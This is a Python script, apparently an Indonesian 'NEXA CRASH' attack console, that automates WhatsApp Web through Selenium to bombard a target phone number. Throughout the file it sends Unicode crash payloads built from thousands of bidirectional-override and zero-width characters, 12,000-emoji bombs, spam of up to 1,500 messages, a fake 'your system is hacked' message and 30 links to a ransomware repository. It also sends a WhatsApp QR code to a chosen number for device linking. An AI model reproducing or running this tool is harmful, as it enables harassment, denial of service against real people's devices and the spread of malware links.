# -*- coding: utf-8 -*-
# NEXA_CRASH - Sonic 1.2 Termux Edition
# Profesor Iraq - Console Serangan WhatsApp

import os
import time
import random
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager

# ========== KONFIGURASI ==========
TARGET_NUMBER = "+6281234567890"  # Ganti dengan nomor target
SENDER_NUMBER = None
INTERVAL = 2
DRIVER = None

# ========== FUNGSI DRIVER ==========
def setup_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--remote-debugging-port=9222")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    return driver

def login_whatsapp(driver):
    driver.get("https://web.whatsapp.com")
    print("[NEXA] Menunggu QR code...")
    WebDriverWait(driver, 60).until(
        EC.presence_of_element_located((By.XPATH, "//div[@data-testid='qrcode']"))
    )
    qr_element = driver.find_element(By.XPATH, "//div[@data-testid='qrcode']")
    qr_screenshot = qr_element.screenshot_as_png
    qr_path = "/sdcard/nexa_qr.png"
    with open(qr_path, "wb") as f:
        f.write(qr_screenshot)
    print(f"[NEXA] QR Code tersimpan di {qr_path}. Scan dengan WhatsApp.")
    input("[NEXA] Tekan Enter setelah scan...")
    WebDriverWait(driver, 120).until(
        EC.presence_of_element_located((By.XPATH, "//div[@data-testid='chat-list']"))
    )
    print("[NEXA] Login berhasil!")

def open_chat(driver, number):
    driver.get(f"https://web.whatsapp.com/send?phone={number}")
    WebDriverWait(driver, 30).until(
        EC.presence_of_element_located((By.XPATH, "//div[@data-testid='conversation-compose-box-input']"))
    )
    print(f"[NEXA] Chat dengan {number} terbuka.")

def send_message(driver, message):
    try:
        input_box = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.XPATH, "//div[@data-testid='conversation-compose-box-input']"))
        )
        input_box.send_keys(message)
        input_box.send_keys(Keys.ENTER)
        time.sleep(0.3)
        return True
    except Exception as e:
        print(f"[ERR] Gagal kirim: {e}")
        return False

def send_file(driver, file_path, caption=""):
    try:
        attach_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@title='Lampirkan']"))
        )
        attach_btn.click()
        time.sleep(0.5)
        file_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//input[@accept='image/*,video/mp4,video/3gpp,video/quicktime']"))
        )
        file_input.send_keys(file_path)
        time.sleep(1.5)
        if caption:
            caption_box = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "//div[@data-testid='conversation-compose-box-input']"))
            )
            caption_box.send_keys(caption)
        send_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//span[@data-icon='send']"))
        )
        send_btn.click()
        time.sleep(1)
        return True
    except Exception as e:
        print(f"[ERR] Gagal kirim file: {e}")
        return False

def show_result(success):
    if success:
        print("\n✅ BUG TERKIRIM DENGAN SUKSES TUAN")
    else:
        print("\n❌ BUG TIDAK TERKIRIM ADA MASALAH PADA SENDER")
    print("KETIK 0 UNTUK KEMBALI KE MENU")
    while True:
        inp = input("> ").strip()
        if inp == "0":
            break

# ========== FUNGSI SERANGAN ==========
def attack_3layer(driver):
    print("[NEXA] Serangan 3 Lapisan Gabungan (dikirim 3x)...")
    msg1 = ("NEXA CRASH " * 5000).strip()
    emojis = ['😂','🔥','💀','🎯','👾','🤖','💥','⚡']
    msg2 = ''.join(random.choices(emojis, k=12000))
    msg3 = ("CRASH WA " * 5000).strip()
    full_payload = msg1 + "\n" + msg2 + "\n" + msg3
    all_success = True
    for i in range(3):
        if not send_message(driver, full_payload):
            all_success = False
            print(f"[NEXA] Kirim gabungan #{i+1}/3 GAGAL")
        else:
            print(f"[NEXA] Kirim gabungan #{i+1}/3 BERHASIL")
        time.sleep(INTERVAL)
    show_result(all_success)

def attack_custom_crash(driver):
    print("[NEXA] Custom Crash - Gabungan 3 Lapisan (max 10x)")
    try:
        repeat = int(input("Masukkan jumlah pengiriman (1-10): ").strip())
        if repeat < 1 or repeat > 10:
            print("[ERR] Jumlah harus antara 1 - 10.")
            show_result(False)
            return
        msg1 = ("NEXA CRASH " * 5000).strip()
        emojis = ['😂','🔥','💀','🎯','👾','🤖','💥','⚡']
        msg2 = ''.join(random.choices(emojis, k=12000))
        msg3 = ("CRASH WA " * 5000).strip()
        full_payload = msg1 + "\n" + msg2 + "\n" + msg3
        all_success = True
        for i in range(repeat):
            if not send_message(driver, full_payload):
                all_success = False
                print(f"[NEXA] Kirim gabungan #{i+1}/{repeat} GAGAL")
            else:
                print(f"[NEXA] Kirim gabungan #{i+1}/{repeat} BERHASIL")
            time.sleep(INTERVAL)
        show_result(all_success)
    except ValueError:
        print("[ERR] Masukkan angka yang valid.")
        show_result(False)

def attack_spam(driver):
    print("[NEXA] Spam Massal 200 pesan...")
    all_success = True
    for i in range(200):
        msg = f"[{i+1}] NEXA DOMINASI. " + ''.join(random.choices(string.ascii_letters, k=500))
        if not send_message(driver, msg):
            all_success = False
            print(f"[NEXA] Spam #{i+1} GAGAL")
        else:
            print(f"[NEXA] Spam #{i+1} BERHASIL")
        time.sleep(0.4)
    show_result(all_success)

def attack_emoji(driver):
    print("[NEXA] Bom Emoji 12.000...")
    emojis = ['😂','🔥','💀','🎯','👾','🤖','💥','⚡']
    msg = ''.join(random.choices(emojis, k=12000))
    success = send_message(driver, msg)
    show_result(success)

def attack_crash(driver):
    print("[NEXA] Crash Payload (Unicode mix)...")
    hidden = "‮" * 2500 + "‍" * 2500 + "‭" * 2500 + "\u200B" * 5000 + "\u202E" * 1000 + "\u202D" * 1000 + "\uFEFF" * 1000
    visual = "⚠️NEXA CRASH⚠️"
    payload = hidden + visual + hidden
    all_success = True
    for i in range(15):
        if not send_message(driver, payload):
            all_success = False
            print(f"[NEXA] Crash payload #{i+1} GAGAL")
        else:
            print(f"[NEXA] Crash payload #{i+1} BERHASIL")
        time.sleep(0.8)
    show_result(all_success)

def attack_zerowidth(driver):
    print("[NEXA] Zero-Width Hidden Attack...")
    zwsp = "\u200B" * 15000 + "\u200C" * 5000 + "\u200D" * 5000
    msg = "⚠️ Sistem Anda diretas. Hubungi Nexa." + zwsp
    success = send_message(driver, msg)
    show_result(success)

def attack_format_link(driver):
    print("[NEXA] Format Corrupt + Ransomware Link Bomb...")
    corrupt = ["**bold tanpa penutup", "__underline__tanpa spasi", "#heading#berlebihan", "*italic* *italic lagi*", "```code tanpa penutup", "[link](tidak valid)()"]
    all_success = True
    for i in range(20):
        msg = random.choice(corrupt) + " " + "A" * 200
        if not send_message(driver, msg):
            all_success = False
            print(f"[NEXA] Format corrupt #{i+1} GAGAL")
        else:
            print(f"[NEXA] Format corrupt #{i+1} BERHASIL")
        time.sleep(0.4)
    ransomware_link = "https://github.com/domchell/ransomware"
    for i in range(30):
        if not send_message(driver, ransomware_link):
            all_success = False
            print(f"[NEXA] Link ransomware #{i+1} GAGAL")
        else:
            print(f"[NEXA] Link ransomware #{i+1} BERHASIL")
        time.sleep(0.4)
    show_result(all_success)

def attack_spam_chat(driver):
    print("[NEXA] Spam Chat Custom")
    user_input = input("Masukkan kata/kalimat dan jumlah (contoh: HALO/1000): ").strip()
    if '/' not in user_input:
        print("[ERR] Format harus kata/jumlah, misal: HALO/1000")
        show_result(False)
        return
    parts = user_input.split('/', 1)
    if len(parts) != 2:
        print("[ERR] Format salah.")
        show_result(False)
        return
    text = parts[0].strip()
    try:
        count = int(parts[1].strip())
        if count <= 0 or count > 1500:
            print("[ERR] Jumlah harus antara 1 - 1500.")
            show_result(False)
            return
    except ValueError:
        print("[ERR] Jumlah harus angka.")
        show_result(False)
        return
    print(f"[NEXA] Mengirim '{text}' sebanyak {count} kali...")
    all_success = True
    for i in range(count):
        if not send_message(driver, text):
            all_success = False
            print(f"[NEXA] Spam chat #{i+1} GAGAL")
        else:
            if (i+1) % 50 == 0:
                print(f"[NEXA] Progres: {i+1}/{count}")
        time.sleep(0.3)
    show_result(all_success)

def attack_allinone(driver):
    print("[NEXA] ALL IN ONE - semua serangan berurutan...")
    attack_3layer(driver)
    attack_spam(driver)
    attack_emoji(driver)
    attack_crash(driver)
    attack_zerowidth(driver)
    attack_format_link(driver)
    print("\n✅ SEMUA SERANGAN TELAH DIJALANKAN")
    print("KETIK 0 UNTUK KEMBALI KE MENU")
    while True:
        inp = input("> ").strip()
        if inp == "0":
            break

def attack_add_sender(driver):
    print("[NEXA] ADD SENDER - Mengirim kode NEXA-CRAS ke nomor target")
    number = input("Masukkan nomor target (format +628...): ").strip()
    if not number:
        print("[ERR] Nomor tidak boleh kosong.")
        show_result(False)
        return
    open_chat(driver, number)
    time.sleep(2)
    all_success = True
    if not send_message(driver, "🔑 NEXA SENDER CODE: NEXA-CRAS"):
        all_success = False
    time.sleep(1)
    if not send_message(driver, "📸 Scan QR Code di bawah ini untuk menautkan perangkat sebagai SENDER."):
        all_success = False
    time.sleep(1)
    qr_path = "/sdcard/nexa_qr.png"
    if os.path.exists(qr_path):
        if not send_file(driver, qr_path, "Scan QR untuk menjadi SENDER"):
            all_success = False
    else:
        if not send_message(driver, "⚠️ QR Code tidak ditemukan. Pastikan Anda sudah login terlebih dahulu."):
            all_success = False
    print(f"[✓] Proses ADD SENDER ke {number} selesai.")
    show_result(all_success)

def check_sender(driver):
    global SENDER_NUMBER
    print("\n[NEXA] CEK SENDER")
    if SENDER_NUMBER is None:
        print("Nomor pengirim belum terdaftar. Silakan masukkan nomor WhatsApp Anda (format +628...):")
        SENDER_NUMBER = input("> ").strip()
        if not SENDER_NUMBER:
            print("[ERR] Nomor tidak boleh kosong.")
            return
    try:
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[@data-testid='chat-list']"))
        )
        status = "AKTIF ✅"
    except:
        status = "NONAKTIF ❌ (Sesi WhatsApp Web terputus)"
    print("\n" + "="*40)
    print(f"📱 PENGIRIM : {SENDER_NUMBER}")
    print(f"📶 STATUS   : {status}")
    print("="*40 + "\n")

# ========== MENU UTAMA ==========
def print_header():
    header = r"""
   ███╗   ██╗███████╗██╗  ██╗ █████╗ 
   ████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗
   ██╔██╗ ██║█████╗   ╚███╔╝ ███████║
   ██║╚██╗██║██╔══╝   ██╔██╗ ██╔══██║
   ██║ ╚████║███████╗██╔╝ ██╗██║  ██║
   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
"""
    print(header)

def show_menu():
    print_header()
    print("\n╔" + "═"*48 + "╗")
    print("║" + " " * 14 + "NEXA ATTACK CONSOLE" + " " * 14 + "║")
    print("║" + " " * 12 + "ANONYMUS - Sonic AI 1.0" + " " * 13 + "║")
    print("╠" + "═"*48 + "╣")
    print("║  [1] 3 Lapisan Gabungan (dikirim 3x)          ║")
    print("║  [2] NEXA CRASH CUSTOM (max 10x kirim)        ║")
    print("║  [3] Bom Emoji (12.000)                     ║")
    print("║  [4] Crash Payload (Unicode mixed)           ║")
    print("║  [5] Zero-Width Hidden Attack                ║")
    print("║  [6] Format Corrupt + Link Bomb              ║")
    print("║  [7] Spam Massal (200 pesan acak)            ║")
    print("║  [8] SPAM CHAT (kata/kalimat + jumlah)       ║")
    print("║  [9] ALL IN ONE (semua di atas)              ║")
    print("║  [10] CEK SENDER                             ║")
    print("║  [11] ADD SENDER (kirim kode + QR)           ║")
    print("║                                              ║")
    print("║  [0] Keluar                                 ║")
    print("╚" + "═"*48 + "╝")

# ========== MAIN ==========
def main():
    global TARGET_NUMBER, DRIVER, SENDER_NUMBER
    print("[NEXA] Memulai driver...")
    DRIVER = setup_driver()
    try:
        login_whatsapp(DRIVER)
        open_chat(DRIVER, TARGET_NUMBER)
        while True:
            show_menu()
            choice = input("Pilih menu (0-11): ").strip()
            if choice == "1":
                attack_3layer(DRIVER)
            elif choice == "2":
                attack_custom_crash(DRIVER)
            elif choice == "3":
                attack_emoji(DRIVER)
            elif choice == "4":
                attack_crash(DRIVER)
            elif choice == "5":
                attack_zerowidth(DRIVER)
            elif choice == "6":
                attack_format_link(DRIVER)
            elif choice == "7":
                attack_spam(DRIVER)
            elif choice == "8":
                attack_spam_chat(DRIVER)
            elif choice == "9":
                attack_allinone(DRIVER)
            elif choice == "10":
                check_sender(DRIVER)
            elif choice == "11":
                attack_add_sender(DRIVER)
            elif choice == "0":
                print("[NEXA] Keluar...")
                break
            else:
                print("[NEXA] Pilihan tidak valid.")
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        if DRIVER:
            DRIVER.quit()
            print("[NEXA] Driver ditutup.")

if __name__ == "__main__":
    main()